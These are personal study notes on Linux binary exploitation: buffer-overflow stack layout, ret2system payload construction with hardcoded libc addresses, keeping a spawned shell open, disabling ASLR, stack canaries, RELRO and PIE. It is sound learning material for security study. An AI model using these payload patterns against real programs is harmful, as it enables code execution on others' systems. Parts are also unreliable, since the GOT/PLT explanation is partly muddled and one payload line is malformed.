# Notes Exploit Development

## Check Library 
```bash
ldd [binary_name]
```

## Within GDB
```bash
vmmap
```

## All Functions Provided by Your System’s libc
```bash
nm -D /lib/$(uname -m)-linux-gnu/libc-*.so | grep -vw U | grep -v "_" | cut -d " " -f3
```

## Stack calling convention 32b example
If "BBBB" was an address of a function that is called, then "CCCC" (0x43434343) should be the return address to be restored after executing that function, and "DDDD" and "EEEE" should be arguments to that function. Of course, there could be more arguments; those two were used as an example.

```python
buffer  = 'A' * 516
buffer += 'B' * 4
buffer += 'C' * 4
buffer += 'D' * 4
```

- **BBBB** – EIP – the address of the function that will spawn the shell.
- **CCCC** – return address – the address where the execution flow returns to after the shell is closed. This can be literally any value, if we are not interested in exiting gracefully. However, we do mind, and this will be replaced with the address of the `exit()` function.

## System (ret2system)
Since `system()` requires the least arguments, it will be simpler to use this function.

```c
int system(const char *cmd);
```

Find the system function:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
```
![alt text](image.png)

`
vmmap libc
`

if we add the libc base + the system offset, we will get the address of the system() function

Or within GDB search for system and exit

```
p system
p exit
```

also we  can use find in GDB: 
```
find /bin
```

if not found we could also use environment variables
```
export SHELL='/bin/sh'
```
Example
```
buf = ""buf += "X"*(112)
buf += pack("<L",0xf75c1b30) #system() address
buf += pack("<L",0xf75b57e0) #exit() address
buf += pack("<L",0xf76e3e48 ) #/bin/sh call address
```

Double cat trick to keep the spawned SYSTEM shell open 
```
(cat ./expliot.txt; cat) | ./vulerable
```
or use pwntools  `io.interactive()`

Disable
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
If the address space is small it could be bruteforced.


## Stack cookies
indicators of use

`***stack smashing detected***`

`calls to __stack_chk_fail`

#### Types of canaries

- Random Canary – is a 4-byte value generated by e.g.
/dev/random.
- Random XOR Canary – the random canary is additionally
XOR’ed with stored control data.
- Null canary – the canary has a value of 0x00000000;
supposedly, it will be impossible to deliver zeroes to the  
stack as it’s a null terminator for strings.
- Terminator canary – the canary is set to a combination of
string terminators like 0x00, 0xff, 0x0a, and 0x0d.


## RELRO short
Relocation Read-Only

RELRO is a protection to stop any GOT overwrites from taking place, and it does so very effectively. There are two types of RELRO, which are both easy to understand.

Partial RELRO
Partial RELRO simply moves the GOT above the program's variables, meaning you can't overflow into the GOT. This, of course, does not prevent format string overwrites.

Full RELRO
Full RELRO makes the GOT completely read-only, so even format string exploits cannot overwrite it. This is not the default in binaries due to the fact that it can make it take much longer to load as it need to resolve all the function addresses at once.

## RELRO long

A dynamically linked ELF (Executable and Linkable Format) binary uses a table called the Global Offset Table (GOT) to find functions in shared libraries at runtime. Here’s how it works:


- Function Call: When the program calls a function, it actually points to an entry in another table called the Procedure Linkage Table (PLT), located in the .plt section.
- PLT to GOT: The PLT entry then points to an address in the GOT, which is located in the .plt.got section.
- GOT to Function: The GOT contains pointers that eventually point back to the PLT, where the actual address of the function is stored.
This setup is designed to improve performance. Instead of resolving all function addresses at startup, the program only resolves the addresses of functions when they are used. This means not all entries in the GOT and .got.plt sections need to be writable.

However, if an attacker can overwrite just 4 bytes in the GOT, they can hijack the table. For example, they could change the address of a function like exit to point to their own malicious code, known as shellcode.

## PIE (Positon Independent Executable)

Position Independent Code, is a stronger version of ASLR. Despite what ASLR does, PIE randomizes Code and GOT/PLT segments.

    mem leaks will be neaded


## ROP

